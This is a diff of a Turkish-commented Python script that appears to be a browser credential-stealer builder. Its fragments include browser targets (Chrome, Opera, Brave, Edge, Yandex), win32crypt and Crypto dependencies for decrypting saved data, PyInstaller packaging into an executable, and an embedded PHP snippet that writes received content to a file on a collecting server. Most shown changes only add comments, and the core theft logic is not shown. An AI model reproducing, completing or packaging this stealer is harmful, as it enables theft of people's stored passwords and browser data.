@@ -1,14 +1,17 @@
 import os,sys,time,platform,base64,json,urllib.request as req,random,threading,shutil
-from data import interface
-isim = os.getlogin()
-konum = os.getcwd()
-sistem = platform.system()
-if sistem == "Windows" and int(platform.uname().release) < 10:
-    print("\n\tRenk kodlarını desteklemeyen sistem kullanıyorsunuz . Renkler devre dışı bırakıldı !")
-    kirmizi = yesil = sari = mavi = pembe = camgoz = normal = ""
-else:
-    kirmizi , yesil , sari , mavi , pembe , camgoz , normal = "\033[31m","\033[32m","\033[33m","\033[34m","\033[35m","\033[36m","\033[0m"
+from data import interface # data klasöründen "interface" i dahil ettik 
+isim = os.getlogin()       # Hangi oturumda olduğumuz
+konum = os.getcwd()        # Olmasa da olurdu ama olsun :)
+sistem = platform.system() # hangi platform'da olduğumuzu görmemiz gerek
 try:
+    import colorama
+except:
+    sys.exit(input("colorama yüklü değil !"))
+colorama.init() #### Renk kodlarını desteklemeyen windows cihazlarda renk kodlarının çalışır hale gelmesine yarıyor ..
+###### Renkler #####
+kirmizi , yesil , sari , mavi , pembe , camgoz , normal = "\033[31m","\033[32m","\033[33m","\033[34m","\033[35m","\033[36m","\033[0m"
+####################
+try: # Çeşitli slogan , raporlarma sistemi vb öğeleri barındıran def'ler
     def temizle():
         if sistem == "Windows":os.system("cls")
         else:os.system("clear")
@@ -67,7 +70,7 @@ try:
     $fp = fopen($dosya,'a');
     fwrite($fp, $icerik);
     fclose($fp);?>
-    """
+    """ # PHP kodumuz
     ################### BURAYA DEVAM ET #########################################################################################################################################################################
 
     seri = sys.argv
@@ -75,12 +78,13 @@ try:
         if not seri[1] in "chrome chromium opera opera_gx brave yandex edge".split():
             sys.exit(f"Bilinmeyen komut : {seri[1]} \n\nVarsayılanlar : chrome chromium opera opera_gx brave yandex edge")
 
-    ############33################################################################################################################################################################################################
-
-    ts()
+    ###########################################################################################################
+    # Kararlı sürümde aktif olacak komut satırına girilen kod doğrultusunda çalışacak betik başlangıcı
+    ###########################################################################################################
+    ts() # ekranı temizle , logoyu ver
     if sistem == "Windows" and sys.version_info.minor == 8:
         input(kirmizi+"\tPython3.8 kullanıyorsunuz ! : "+normal+"\n\n\tPyInstaller win32crypt kütüphanesini exe yaparken hata verecektir .\n\tGinede .pyw ve .pyc dosyaları oluşturabilirsiniz . \n\tPython3.7 sürümünü yüklemenizi tavsiye ederim ..")
-        ts()
+        ts() # PYTHON 3.8 'i kullanırken , win32crypt kütüphanesi PyInstaller ile .exe hale getirilemiyor .
 
 
     try:import PyInstaller
@@ -107,7 +111,7 @@ try:
             print(kirmizi+"\tCrypto modülü yüklü değil !"+normal+" Lütfen Dene : \n")
             print("\tpip3 uninstall crypto\n\tpip3 install crypto\n\tpip3 uninstall pycryptodome\n\tpip3 install pycryptodome\n")
             print("\tDaha Detaylı Bilgi Için : https://github.com/dlitz/pycrypto/issues/156")
-            exit0()
+            exit0() # Bu modülün crypto hali değil Crypto hali gerekiyor !
     else:
         print(kirmizi+"\tSistemin desktelenmiyor ! [Henüz]"+normal)
         raport("Otomatik Desteklenmeyen Sistem Mesajı !")
@@ -815,3 +819,4 @@ except Exception as hata:
     print(kirmizi+"\n\tHata yakalandı !"+normal+" Incelemeniz için : \n\t"+str(hata))
     raport(hata)
     exit0()
+# Kodlamanın pek profesyonel olmadığının farkındayım , ginede geliştirmek için oldukça müsait ...
